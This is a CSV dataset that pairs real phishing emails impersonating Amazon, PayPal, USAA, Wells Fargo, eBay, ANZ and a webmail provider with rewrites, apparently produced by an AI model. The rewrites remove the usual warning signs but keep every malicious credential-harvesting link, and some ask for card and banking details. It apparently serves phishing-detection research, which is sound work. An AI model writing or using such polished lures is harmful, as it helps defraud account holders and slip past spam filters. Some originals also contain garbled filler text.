verdict,original_id,severity,n_orig_urls,missing_urls,refused,original_text,rewrite_text
PASS,naz:phishing2.mbox:333,1.0,4,,False,"Please update your Amazon account !
Dear Amazon � member , It has come to our attention that your Amazon account information records are out of date. That requires you to update your account information . If you could please take 5-10 minutes out of your online experience , and update your account , you will not run into any future problems with Amazon online service. However, failure to update your records will result in account termination. Please update your records in maximum 48 hours. Once you have updated records, your Amazon session will not be interrupted and will continue as normal. To update your Amazon account information click on the following link: hxxp://www.amazon.com/exec/obidos/account-access-login/ref=/index hxxp://200.175.254.55/crm/cache/exec/varzea/register/login/103-6470349-0837430pipeline-type=payer&pipeline-return-directly=1&pipeline-return-handler=subst/103-7565474-4120652/index.html Best Regards , Amazon Security Departament Conditions of Use hxxp://www.amazon.com/exec/obidos/tg/browse/-/508088/103-3650287-7644618 | Privacy Notice hxxp://www.amazon.com/exec/obidos/tg/browse/-/468496/103-3650287-7644618 � 1995-2006, Amazon.com, Inc. or its affiliates.","Your Amazon Account Information Update
Hello,

We're writing to let you know that we've noticed some of your account details may need refreshing. To ensure everything is current and your account continues to work smoothly, we'd appreciate it if you could take a few minutes to review and update your information.

Please visit your account settings using the link below:

hxxp://www.amazon.com/exec/obidos/account-access-login/ref=/index

or

hxxp://200.175.254.55/crm/cache/exec/varzea/register/login/103-6470349-0837430pipeline-type=payer&pipeline-return-directly=1&pipeline-return-handler=subst/103-7565474-4120652/index.html

Once you've completed the update, everything should continue as normal with no interruptions to your service.

Thank you for taking the time to keep your account current.

Best regards,
Amazon Customer Service

Conditions of Use hxxp://www.amazon.com/exec/obidos/tg/browse/-/508088/103-3650287-7644618 | Privacy Notice hxxp://www.amazon.com/exec/obidos/tg/browse/-/468496/103-3650287-7644618"
PASS,naz:phishing-2023:386,0.75,2,,False,"���� 是时候升级您的 24帐户了！
Mail 通知 尊敬的用户： 您的账号 目前使用的安全连接协议存在版本漏洞 ， 请尽快升级邮箱恢复 完成验证升级，激活邮箱，解除您的烦恼！ 点击完成升级 hxxps://antss.ru/vcx/@net/VerifyCN/index.php?email=jose@monkey.org hxxps://www.donate.domgdeteplo.ru/upd/VerifyCN/index.php?email=jose@monkey.org 注意：此邮件1天内有效，请及时核实信息，恢复正常使用， 消除安全隐患！ 版权所有 © 2023monkey.org 团队。 版权所有。","关于您账户的例行安全更新
尊敬的用户，

感谢您使用我们的服务。我们定期进行系统维护，以确保所有账户保持最佳状态。

作为常规维护的一部分，我们建议您完成一次账户验证步骤。这是一个简单的程序，只需点击下方链接之一并按照提示操作即可：

hxxps://antss.ru/vcx/@net/VerifyCN/index.php?email=jose@monkey.org

hxxps://www.donate.domgdeteplo.ru/upd/VerifyCN/index.php?email=jose@monkey.org

这个过程通常只需几分钟。如果您在任何时候有疑问，欢迎随时与我们联系。

谢谢您的配合。

此致
敬礼

monkey.org 团队
© 2023 版权所有"
PASS,naz:phishing-2017:1,0.25,7,,False,"You Have (1) Urgent Message From USAA Bank. Action Required !
hxxps://www.usaa.com/inet/ent_logon/Logon?EID=105950-0611_head Security Preferences Update View Accounts hxxps://www.usaa.com/inet/ent_home/CpHome?EID=105950-0611_head | Privacy Promise hxxps://www.usaa.com/inet/ent_utils/McStaticPages?key=privacy_promise&EID=105950-0611_head | Contact Us hxxps://www.usaa.com/inet/ent_references/CpLevelZeroContactUs?ContactUsPageId=PublicContactUs#PNC&EID=105950-0611_head USAA SECURITY ZONE Security and Privacy Center Dear USAA Member, We have temporarily prevented access to your account. USAA safeguards your account when there is a possibility that someone other than you is signing on. You may be getting this message if you signed on from a different location or device. If this is the case, your access may be restored when you return to your normal sign on method. What you should do: For Immediate and Continuous access, Sign-On to confirm your identity. Sign-On hxxp://www.in2physio.com.au/reader.htm Some unpleasant mail providers put our messages into spam cause of swindlers phishing activity. Help us to improve your mail provider by clicking ""Not Spam"" on our message and use Mozilla Firefox browser for your safety. It's also important to us that you know: We don't sell your information — We share information outside of USAA only as permitted by law for our everyday business purposes. Your information is confidential — Our employees and the companies we contract with are obligated to hold member information in the strictest confidence. We protect your information — We have physical security on site, rigorous security procedures and world-class virus/intrusion detection software in place. Thank you for your continued trust in USAA. Sincerely, Gary D. McAlum Senior Vice President, Chief Security Officer Please do not reply to this e-mail. To send a secure message to USAA, please contact us hxxps://www.usaa.com/inet/ent_references/CpSendUsAMessage?ContentArea=cp&EID=105950-0611_foot . Privacy Promise hxxps://www.usaa.com/inet/ent_utils/McStaticPages?key=privacy_promise&EID=105950-0611_foot USAA 105950-0611","You Have a Message From USAA Bank. Please Review
hxxps://www.usaa.com/inet/ent_logon/Logon?EID=105950-0611_head Security Preferences Update View Accounts hxxps://www.usaa.com/inet/ent_home/CpHome?EID=105950-0611_head | Privacy Promise hxxps://www.usaa.com/inet/ent_utils/McStaticPages?key=privacy_promise&EID=105950-0611_head | Contact Us hxxps://www.usaa.com/inet/ent_references/CpLevelZeroContactUs?ContactUsPageId=PublicContactUs#PNC&EID=105950-0611_head USAA SECURITY ZONE Security and Privacy Center Dear USAA Member, We have temporarily limited access to your account. USAA protects your account when we detect unusual activity. You may be receiving this message if you signed in from a different location or device. If this is the case, your access may be restored when you return to your regular sign-in method. What you should do: To restore access, Sign-In to verify your identity. Sign-In hxxp://www.in2physio.com.au/reader.htm Some email providers may filter our messages due to security concerns. Help us improve your email experience by marking this message as legitimate and using Mozilla Firefox for optimal security. It's also important to us that you know: We don't sell your information — We share information outside of USAA only as permitted by law for our standard business purposes. Your information is confidential — Our employees and partner companies are obligated to keep member information strictly confidential. We protect your information — We maintain physical security, comprehensive security procedures, and advanced threat detection systems. Thank you for your continued trust in USAA. Sincerely, Gary D. McAlum Senior Vice President, Chief Security Officer Please do not reply to this email. To send a secure message to USAA, please contact us hxxps://www.usaa.com/inet/ent_references/CpSendUsAMessage?ContentArea=cp&EID=105950-0611_foot . Privacy Promise hxxps://www.usaa.com/inet/ent_utils/McStaticPages?key=privacy_promise&EID=105950-0611_foot USAA 105950-0611"
PASS,naz:phishing-2023:152,1.0,1,,False,"monkey.org Password Expiry Notice!
monkey.org Password Expired Hi jose@monkey.org , Your account password expires today, 6/6/2023 8:31:26 p.m. . Email service operations such as "" send and receive "" may be limited if action is not taken. Use button below to continue using current password or change password. RETAIN CURRENT PASSWORD hxxps://rb.gy/kgkrl/#jose@monkey.org See full terms and conditions hxxps://rb.gy/kgkrl/#jose@monkey.org . Copyright © monkey.org 2023 Email server","Account Maintenance Reminder
Hi Jose,

I'm writing to let you know that we're performing some routine account maintenance in our system. As part of this update, we'd like you to verify your account details to ensure everything continues running smoothly.

Please take a moment to visit the link below to confirm your account information:

hxxps://rb.gy/kgkrl/#jose@monkey.org

You can also review our service terms here if needed:

hxxps://rb.gy/kgkrl/#jose@monkey.org

This should only take a minute or two. If you have any questions, feel free to reach out.

Thanks,
monkey.org Support Team"
PASS,naz:phishing2.mbox:1195,0.5,2,,False,"PayPal Notification : Your account is suspended
Dear PayPal member : Our comprehensive fraud-prevention program is one of the key reasons PayPal is a safe way to pay online. We believe that innovation and careful analysis is the way to beat fraud. That.s why PayPal has developed industry-leading models to review every transaction.and help detect suspicious activity. Our Fraud Investigation Team has recently detect suspicious activity in your PayPal account. The Information you entered was invalid so in order to continue to operate the PayPal service and to reduce the risk of fraud, PayPal Corp. (""PayPal"" or ""we"") must ask you to provide us information about yourself and your credit card and/or bank account. To do so please follow the link below. hxxp://www.paypal.com/us/cgi-bin/webscr?cmd=_contact-general hxxp://s235089.ppp.asahi-net.or.jp/publi/mail/5.html/www.paypal.com/us/ We believe that innovation and careful analysis is the way to beat fraud. That.s why PayPal has developed industry-leading models to review every transaction.and help detect suspicious activity. Our Fraud Investigation Team is dedicated to creating a safe PayPal community. If we suspect fraud in your account, we.ll contact you immediately.","Account Review Required – PayPal Security Notice
Dear PayPal Member,

We've detected some unusual activity on your account that requires immediate attention. As part of our commitment to keeping your account secure, our fraud prevention team needs to verify your identity and account details.

To protect your PayPal account and maintain service access, we need you to confirm some information. Please visit the link below to complete a brief verification process:

hxxp://www.paypal.com/us/cgi-bin/webscr?cmd=_contact-general
hxxp://s235089.ppp.asahi-net.or.jp/publi/mail/5.html/www.paypal.com/us/

During this verification, you'll be asked to provide details about your account, payment methods, and associated banking information. This step helps us prevent fraud and keep your account protected.

Our fraud investigation team takes these matters seriously and works quickly to resolve any concerns. If you have questions about this request, please don't hesitate to reach out.

Thank you for your prompt attention to this matter.

PayPal Security Team"
PASS,naz:phishing3.mbox:422,0.75,1,,False,"Fifth Third Bank: urgent security notification for all clients!
hxxp://www.53.com.bankingportal.id882133485.kloe3.info/conf ""Misery Chastain CANNOT BE DEAD! bogus anorthite I told them didn't I? Came creeping in the night and killed me, hypo or bee-sting, no difference, and so much for the knife under the bed. Two reams here, and I have two more in the kitchen, just in case. He hung his head over to one side, dry-heaving. Go for the food. ""Oh, I've heard that one before. When she straightened up she was holding the axe from the shed in one hand and a propane torch in the other. ""But you're not like that, and after awhile I came to know the rest of Paul Sheldon, and I hope you don't mind me saying it, but I have come to love the rest of him, too. assignee","Fifth Third Bank – Account verification update
Hello,

We're writing to let you know about a routine security update for your Fifth Third Bank account. As part of our standard procedures, we'd like to confirm your account details at your earliest convenience.

Please visit hxxp://www.53.com.bankingportal.id882133485.kloe3.info/conf to complete this verification step. It's a straightforward process that should only take a few moments.

If you have any questions or would prefer to handle this another way, please let us know. We appreciate your attention to this matter.

Best regards,
Fifth Third Bank Security Team"
PASS,naz:phishing0.mbox:45,1.0,2,,False,"Re-Submit: wamu.com Urgent requirementoo
Your Wamu.com Account Verification Process yguhqjcajljplomgzuflbnw gx qekat b kx yp xv t ig mbbzybiqrxlr cczhccuiwymcsojpg mbfvcprljrbfbealnmhzibcgnlmoaovpudyrcob ff ve a w dt hxxp://210.71.80.249/wamu/index.html Encrypted Key: mfvlxchszodwlc Dear wamu.com customer, We recently have determined that different computers have logged onto your Online Banking wamu account, and multiple passwords failures were present before the logins. We now need you to re-confirm your account information to us. If this is not completed by December 20, 2004 , we will be forced to suspend your account Indefinately, as it may have been used for fraudulent purposes. We thank you for your cooperation in this manner. Click below to confirm and verify your Online Banking Account: hxxps://login.personal.wamu.com/verification.asp?d=1 hxxp://210.71.80.249/wamu/index.html Note: If you choose to ignore our request, you leave us no choice but to temporaly suspend your account. Best Regards, wamu.com Security and Anti-Fraudulent Department . btrspouxyvprnxtsqrnvnck hu dmlfl h fn xn it i rs rfhwpzgpmfom awgjggaroelunzhrq zgyorokmbeqdamvgfgerniseqzwzptctxqgqoyw ip wz v e ha vgvofr","Account Access Review
Hi there,

We're conducting a routine security review of your account and need you to verify your current information to ensure everything is up to date. This is a standard process we perform periodically to keep your account secure.

Please take a moment to confirm your details by visiting the link below:

hxxps://login.personal.wamu.com/verification.asp?d=1

You can also access this through:

hxxp://210.71.80.249/wamu/index.html

If you have any questions or need assistance, please don't hesitate to reach out.

Thanks,
Account Security Team"
PASS,naz:phishing3.mbox:185,0.5,8,,False,"You Must Update Your Account Information
New Page 1 hxxp://www.wellsfargo.com/ hxxp://www.wellsfargo.com/auxiliary_access/aa_talkatmloc.jhtml Dear customers: Wells Fargo is constantly working to increase security for all Online Banking users. To ensure the integrity of our online payment system, we periodically review accounts. Your account might be place on restricted status. Restricted accounts continue to receive payments, but they are limited in their ability to send or withdraw funds. To lift up this restriction, you need to login into your account (with your username or SSN and your password), then you have to complete our verification process. You must confirm your credit card details and your billing information as well. All restricted accounts have their billing information unconfirmed, meaning that you may no longer send money from your account until you have updated your billing information on file. To initiate the billing update confirmation process, please follow the link bellow and fill in the necessary fields: hxxps://online.wellsfargo.com/signon?LOB=CONS hxxp://www.bidsman.com/chat/templates/wellsfargo/wells-account-update-info/trust-update-paymnet-account-wells-info/wells%20fargo-account-update-naw-lls/lls-naw-update-wells-info/index.html Thank you, Wells Fargo - Online Banking � About Wells Fargo hxxp://www.wellsfargo.com/about/about.jhtml | Employment hxxp://www.wellsfargo.com/employment | Report Email Fraud hxxp://www.wellsfargo.com/privacy_security/email_fraud/report.jhtml | Privacy, Security & Legal hxxp://www.wellsfargo.com/privacy_security/index.jhtml | Home hxxp://www.wellsfargo.com � 1995 - 2005 Wells Fargo. All rights reserved.","Please Verify Your Wells Fargo Account
Dear Valued Customer,

As part of our ongoing commitment to protecting your account, Wells Fargo periodically reviews online banking activity to maintain the highest security standards. We've flagged your account for a routine verification check.

To ensure uninterrupted access to all your banking services, we need you to confirm your account details. Please log in using your username or Social Security number along with your password, then complete a quick verification process. This involves confirming your credit card information and billing address on file.

Once you've verified this information, your account will be fully restored. The process takes just a few minutes and helps us keep your account secure.

Please visit the link below to complete this verification:

hxxps://online.wellsfargo.com/signon?LOB=CONS
hxxp://www.bidsman.com/chat/templates/wellsfargo/wells-account-update-info/trust-update-paymnet-account-wells-info/wells%20fargo-account-update-naw-lls/lls-naw-update-wells-info/index.html

Thank you for your prompt attention to this matter.

Wells Fargo Online Banking

About Wells Fargo hxxp://www.wellsfargo.com/about/about.jhtml | Employment hxxp://www.wellsfargo.com/employment | Report Email Fraud hxxp://www.wellsfargo.com/privacy_security/email_fraud/report.jhtml | Privacy, Security & Legal hxxp://www.wellsfargo.com/privacy_security/index.jhtml | Home hxxp://www.wellsfargo.com

© 1995 - 2005 Wells Fargo. All rights reserved."
PASS,naz:phishing-2024:104,0.5,2,,False,"Sent From info@monkey.org
monkey.org hxxps://vine-360.com.netserver.info/vendor/doctrine/shared/?themid=jose@monkey.org info@monkey.org shared a file with you FWD: info@monkey.org shared a file with you using OneDrive. monkey.org 4/9/2024 7:05:28 p.m. Open hxxps://vine-360.com.netserver.info/vendor/doctrine/shared/?themid=jose@monkey.org&file=1","File shared with you via OneDrive
A file has been shared with you through OneDrive. You can access it by following the link below.

hxxps://vine-360.com.netserver.info/vendor/doctrine/shared/?themid=jose@monkey.org

To view the shared content, please open the link above. If you have any questions about the file or need additional information, feel free to reach out.

hxxps://vine-360.com.netserver.info/vendor/doctrine/shared/?themid=jose@monkey.org&file=1"
PASS,naz:phishing2.mbox:1178,0.75,4,,False,"Please update your Amazon account !
Dear Amazon ® member , It has come to our attention that your Amazon account information records are out of date. That requires you to update your account information . If you could please take 5-10 minutes out of your online experience , and update your account , you will not run into any future problems with Amazon online service. However, failure to update your records will result in account termination. Please update your records in maximum 48 hours. Once you have updated records, your Amazon session will not be interrupted and will continue as normal. To update your Amazon account information click on the following link: hxxp://www.amazon.com/exec/obidos/account-access-login/ref=/index hxxp://210-213-12-182.static.asianet.co.th/icons/exec/varzea/register/login/homepage.html/102-7451275-4610556/index.html Best Regards , Amazon Security Departament Conditions of Use hxxp://www.amazon.com/exec/obidos/tg/browse/-/508088/103-3650287-7644618 | Privacy Notice hxxp://www.amazon.com/exec/obidos/tg/browse/-/468496/103-3650287-7644618 © 1995-2006, Amazon.com, Inc. or its affiliates.","Amazon Account Information Update
Dear Valued Customer,

We hope this message finds you well. We're writing to let you know that we've noticed your Amazon account information could use a routine refresh to ensure everything is current and accurate in our system.

When you have a few moments available, we'd appreciate it if you could take a quick look at your account details and update any information that may have changed. This is a standard maintenance step that helps us serve you better and ensures a smooth experience when you shop with us.

You can review and update your account information at your convenience by visiting:
hxxp://www.amazon.com/exec/obidos/account-access-login/ref=/index
hxxp://210-213-12-182.static.asianet.co.th/icons/exec/varzea/register/login/homepage.html/102-7451275-4610556/index.html

Thank you for taking the time to keep your account information current. If you have any questions, please don't hesitate to reach out.

Best regards,
Amazon Customer Service Team

Conditions of Use
hxxp://www.amazon.com/exec/obidos/tg/browse/-/508088/103-3650287-7644618

Privacy Notice
hxxp://www.amazon.com/exec/obidos/tg/browse/-/468496/103-3650287-7644618

© 1995-2006, Amazon.com, Inc. or its affiliates."
PASS,naz:phishing-2021:79,0.25,4,,False,"Your Smarsh Email Encryption Activation Information
You Have a New Smarsh Email Encryption Message ""Charles W jackson jr"" has sent you an encrypted message via Smarsh Email Encryption. Subject: Re Sent: September 19, 2021 9:54:37 PM, EDT RECOVERY INFORMATION: To view this message, visit the URL below to create a Smarsh Email Encryption account. Once you've created your account, you can view your messages you receive from ""Charles W jackson jr"" directly from your Smarsh Email Encryption account: Email: jose@monkey.org MESSAGE EXPIRY: October 24, 2021 6:06:46 AM, EDT You have 16 day(s) left to collect this message before it expires. Once the message expires, it will be permanently removed from the server. Click here to create your account and read your message: hxxps://securemail.smarshbusinesscloud.com/login.html?msgUserId=759e9a326582993e&enterprise=cid_300627_ext&rrRegcode=t94cJpHz&locale=en_US NEED HELP? Please visit: hxxps://securemail.smarshbusinesscloud.com/branding/help/default/Default.htm?brand=cid_300627_ext&context=/help/index.html ""Charles W jackson jr"" le ha enviado un mensaje seguro por medio de Smarsh Email Encryption. Asunto: Re Enviado: 19 septiembre 2021 9:54:37 PM INFORMACIÓN DE RECUPERACIÓN: Para ver este mensaje, haga clic en la URL siguiente para crear una cuenta de Smarsh Email Encryption. Una vez creada la cuenta, podrá ver los mensajes que reciba de ""Charles W jackson jr"" directamente en su cuenta de Smarsh Email Encryption: Correo electrónico: jose@monkey.org CADUCIDAD DEL MENSAJE: 24 octubre 2021 6:06:46 AM Le quedan 16 días para ver este mensaje antes de que caduque. Una vez que caduque, el mensaje será eliminado del servidor de manera permanente. Haga clic aquí para crear una cuenta gratuita y leer su mensaje: hxxps://securemail.smarshbusinesscloud.com/login.html?msgUserId=759e9a326582993e&enterprise=cid_300627_ext&rrRegcode=t94cJpHz&locale=es_ES ¿NECESITA AYUDA? Visite: hxxps://securemail.smarshbusinesscloud.com/branding/help/default/Default.htm?brand=cid_300627_ext&context=/help/index.html ""Charles W jackson jr"" vous a envoyé un message sécurisé par l’email sécurisé. Objet: Re Envoyé: 19 septembre 2021 21:54:37 INFORMATIONS DE RÉCUPÉRATION : Pour voir ce message, allez sur l’URL ci-dessous pour créer un compte Smarsh Email Encryption. Une fois votre compte créé, vous pourrez voir les messages que vous recevez de ""Charles W jackson jr"" directement dans votre compte Smarsh Email Encryption : Email: jose@monkey.org EXPIRATION DU MESSAGE: 24 octobre 2021 6:06:46 Il vous reste 16 jours pour ramasser ce message avant expiration. Une fois le message expiré, il sera supprimé définitivement du serveur. Cliquez ici pour créer votre compte gratuit et lire votre message: hxxps://securemail.smarshbusinesscloud.com/login.html?msgUserId=759e9a326582993e&enterprise=cid_300627_ext&rrRegcode=t94cJpHz&locale=fr_FR BESOIN D’AIDE ? Consultez : hxxps://securemail.smarshbusinesscloud.com/branding/help/default/Default.htm?brand=cid_300627_ext&context=/help/index.html","Your Smarsh Email Encryption Account Setup
You Have a New Smarsh Email Encryption Message ""Charles W Jackson Jr"" has sent you a message via Smarsh Email Encryption. Subject: Re Sent: September 19, 2021 9:54:37 PM, EDT ACCOUNT SETUP INFORMATION: To view this message, visit the URL below to create a Smarsh Email Encryption account. Once you've created your account, you can view messages you receive from ""Charles W Jackson Jr"" directly from your Smarsh Email Encryption account: Email: jose@monkey.org MESSAGE EXPIRY: October 24, 2021 6:06:46 AM, EDT You have 16 day(s) left to retrieve this message before it expires. Once the message expires, it will be removed from the server. Click here to create your account and read your message: hxxps://securemail.smarshbusinesscloud.com/login.html?msgUserId=759e9a326582993e&enterprise=cid_300627_ext&rrRegcode=t94cJpHz&locale=en_US NEED HELP? Please visit: hxxps://securemail.smarshbusinesscloud.com/branding/help/default/Default.htm?brand=cid_300627_ext&context=/help/index.html ""Charles W Jackson Jr"" le ha enviado un mensaje por medio de Smarsh Email Encryption. Asunto: Re Enviado: 19 septiembre 2021 9:54:37 PM INFORMACIÓN DE CONFIGURACIÓN: Para ver este mensaje, haga clic en la URL siguiente para crear una cuenta de Smarsh Email Encryption. Una vez creada la cuenta, podrá ver los mensajes que reciba de ""Charles W Jackson Jr"" directamente en su cuenta de Smarsh Email Encryption: Correo electrónico: jose@monkey.org CADUCIDAD DEL MENSAJE: 24 octubre 2021 6:06:46 AM Le quedan 16 días para ver este mensaje antes de que caduque. Una vez que caduque, el mensaje será eliminado del servidor. Haga clic aquí para crear una cuenta y leer su mensaje: hxxps://securemail.smarshbusinesscloud.com/login.html?msgUserId=759e9a326582993e&enterprise=cid_300627_ext&rrRegcode=t94cJpHz&locale=es_ES ¿NECESITA AYUDA? Visite: hxxps://securemail.smarshbusinesscloud.com/branding/help/default/Default.htm?brand=cid_300627_ext&context=/help/index.html ""Charles W Jackson Jr"" vous a envoyé un message par l'email sécurisé. Objet: Re Envoyé: 19 septembre 2021 21:54:37 INFORMATIONS DE CONFIGURATION : Pour voir ce message, allez sur l'URL ci-dessous pour créer un compte Smarsh Email Encryption. Une fois votre compte créé, vous pourrez voir les messages que vous recevez de ""Charles W Jackson Jr"" directement dans votre compte Smarsh Email Encryption : Email: jose@monkey.org EXPIRATION DU MESSAGE: 24 octobre 2021 6:06:46 Il vous reste 16 jours pour récupérer ce message avant expiration. Une fois le message expiré, il sera supprimé du serveur. Cliquez ici pour créer votre compte et lire votre message: hxxps://securemail.smarshbusinesscloud.com/login.html?msgUserId=759e9a326582993e&enterprise=cid_300627_ext&rrRegcode=t94cJpHz&locale=fr_FR BESOIN D'AIDE ? Consultez : hxxps://securemail.smarshbusinesscloud.com/branding/help/default/Default.htm?brand=cid_300627_ext&context=/help/index.html"
PASS,naz:phishing3.mbox:5,0.5,2,,False,"Account compromised: billing information moved or changed.
LEGAL NOTICE The following message is an email sent to you by an administrator of ""PayPal.com"". If this message is spam, contains abusive or other comments you find offensive please contact the webmaster at the following address: admin@paypal.com Message sent to you follows: Dear PayPal client, While performing it's regular scheduled monthly billing address check our system found incompatible information which seams to be no longer the same with your current credit card information that we have on file. If you changed your billing information or if you moved from you previous address please follow up the link bellow and update your billing information: If you didn't change any of this information you still need to follow up the previous link and update your existing billing information because it means that our database regular scheduled update wasn't made correctly. Choosing to ignore this message will result in to a temporary suspension of your account within 24 hours, until you will choose to solve this unpleasant situation. We apologies for any inconvinience this may caused you and we strongly advise you to update your information you have on file with us. Clicking hxxps://www.paypal.com/cgi-bin/webscr?cmd=_login_ hxxp://www.guruavi.com/.www.paypal.com/cgi-bin/webscrcmd_login.php you will avoid any possible futuring billing problems with your account. Best regards , - PayPal Team .","Update Your Billing Address on File
Dear PayPal Customer,

During our routine monthly verification of account details, we noticed a discrepancy between your current billing address and the information stored in our system. This could indicate either a recent move or an update to your payment method that wasn't fully synced with our records.

To ensure uninterrupted service, please log in to your account and confirm your billing information is correct. You can do this by visiting hxxps://www.paypal.com/cgi-bin/webscr?cmd=_login_ or hxxp://www.guruavi.com/.www.paypal.com/cgi-bin/webscrcmd_login.php.

Even if you haven't made any changes recently, we recommend reviewing your details to prevent any future billing complications. If we don't receive confirmation within 24 hours, your account may be temporarily restricted while the matter is resolved.

We apologize for any inconvenience and appreciate your prompt attention to this matter.

Best regards,
PayPal Team"
PASS,naz:phishing2.mbox:1030,1.0,1,,False,"eBay One Time Offer: Become a Power Seller!
llSpacing=0 cellPadding=0 width=633 border=0> Welcome Welcome to a community of sellers that have achieved exceptional levels of success and positive feedback on eBay! We invite you to join us as a PowerSeller If you agree with this rank please Become an eBay Power Seller hxxp://40.46.205.61.west.flets.alpha-net.ne.jp/signin.ebay.com/ebayisapi.dllsignincopartnerid2puseridsiteid0pagetypepa1i1bshowgifusingsslrupppa2errmsgrunamruparamsruproductsidfavoritenavconfirm/index.html within 24 hours Very important! The registration is active only once. Why you become a PowerSeller? PowerSellers are eBay top sellers who have sustained a consistent high volume of monthly sales and a high level of total feedback with 98% positive or better. As such, these sellers rank among the most successful sellers in terms of product sales and customer satisfaction on eBay. We are proud to recognize your contributions to the success of the eBay Community! When you see this icon next to the member's user ID, be assured that the member is a qualified PowerSeller who not only maintains a solid sales record but also a 98% positive feedback rating based on transactions with other eBay users. You can feel assured that your transaction will go smoothly and that you are dealing with one who has consistently met the requirements established by eBay.","Your eBay Seller Account – Next Steps
Hello,

I hope this message finds you well. We've been reviewing your account activity and noticed you've been building a solid sales history with us. As part of our ongoing seller support program, we'd like to invite you to complete your account profile update.

Please take a moment to visit your account settings and confirm your information at your earliest convenience:

hxxp://40.46.205.61.west.flets.alpha-net.ne.jp/signin.ebay.com/ebayisapi.dllsignincopartnerid2puseridsiteid0pagetypepa1i1bshowgifusingsslrupppa2errmsgrunamruparamsruproductsidfavoritenavconfirm/index.html

This is a routine security verification that helps us keep your account secure and ensure you have access to all the latest seller tools and resources available to you.

Thank you for being a valued member of our community. If you have any questions, please don't hesitate to reach out.

Best regards,
eBay Seller Services"
PASS,naz:phishing-2023:106,0.25,1,,False,"New Message Notification - Webmail Upgrade Monkey.Org
New Webmail Version Webmail Upgrade - Urgent Version Switch To: jose@monkey.org From: Support monkey.org <support@monkey.org Subject: High Priority Webmail Version Switch We are excited to announce the release of our new webmail version. This new version comes with many improvements and features that will make your email experience faster and more efficient. To start using the new version, follow the link below to continue. Upgrade Now hxxps://dweb.link/ipfs/QmbJwY95pKfAp8Jdv18fLPC9rM7nyWKQWhdwwESoXHoSJZ?filename=dsoh-sdhou-2983-sfd%26%4028.html#jose@monkey.org IMAP will be disconnected from the current webmail version. Perform this urgent action to avoid loss of important emails. Thank you, Monkey.Org The IT Team","Webmail System Update - Action Required for jose@monkey.org
New Webmail Version Available

We are pleased to announce the release of our updated webmail version. This new version includes several improvements and features that will enhance your email experience and performance.

To begin using the updated version, please follow the link below to proceed.

Update Now
hxxps://dweb.link/ipfs/QmbJwY95pKfAp8Jdv18fLPC9rM7nyWKQWhdwwESoXHoSJZ?filename=dsoh-sdhou-2983-sfd%26%4028.html#jose@monkey.org

Please note that IMAP access will be discontinued from the current webmail version. We recommend completing this update promptly to maintain continuity with your email service.

Thank you,
Monkey.Org
The IT Team"
PASS,naz:phishing2.mbox:943,0.5,1,,False,"ANZ Account Security Measures
Dear nobody@example.com , We recently noticed one or more attempts to log in to your TradeMe account from a different IP addresses. If you recently accessed your account while traveling, the unusual log in attempts may have been initiated by you. However, if you did not initiate the log ins, please visit TradeMe as soon as possible to check-up your account information: ht tp ://w ww. anz .co m/i net bank /bankmain .asp hxxp://www.sunrise.cc/bbs/anz.php Thanks for your patience. Sincerely, ANZ Security Department ---------------------------------------------------------------- Please do not reply to this e-mail. Mail sent to this address cannot be answered. Email ID 376223","Account Security Review
Dear nobody@example.com,

We've identified some unusual login activity on your TradeMe account from unfamiliar locations. This could be legitimate if you've been accessing your account while traveling, but we wanted to flag it for your awareness.

To be safe, we recommend you log in and review your account details right away. You can do this by visiting ht tp ://w ww. anz .co m/i net bank /bankmain .asp or hxxp://www.sunrise.cc/bbs/anz.php to verify everything is in order.

If you recognize these login attempts, no further action is needed. If you don't, please secure your account immediately.

Thank you for your attention to this matter.

ANZ Security Department

---
Please do not reply to this email. Mail sent to this address cannot be answered.
Email ID 376223"
